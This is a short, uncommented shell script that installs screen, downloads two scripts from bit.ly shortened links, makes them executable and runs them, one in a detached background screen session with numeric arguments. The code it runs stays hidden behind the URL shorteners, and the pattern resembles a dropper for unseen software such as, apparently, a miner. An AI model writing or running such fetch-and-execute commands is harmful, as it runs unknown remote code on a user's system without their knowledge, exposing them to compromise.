#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://bit.ly/2UStkiz
mv 2UStkiz dh.sh
wget https://bit.ly/2Y6rHz4 
mv 2Y6rHz4 man2.sh
chmod +x man2.sh
screen -dmS man2 ./man2.sh 60 70
chmod +x dh.sh
./dh.sh
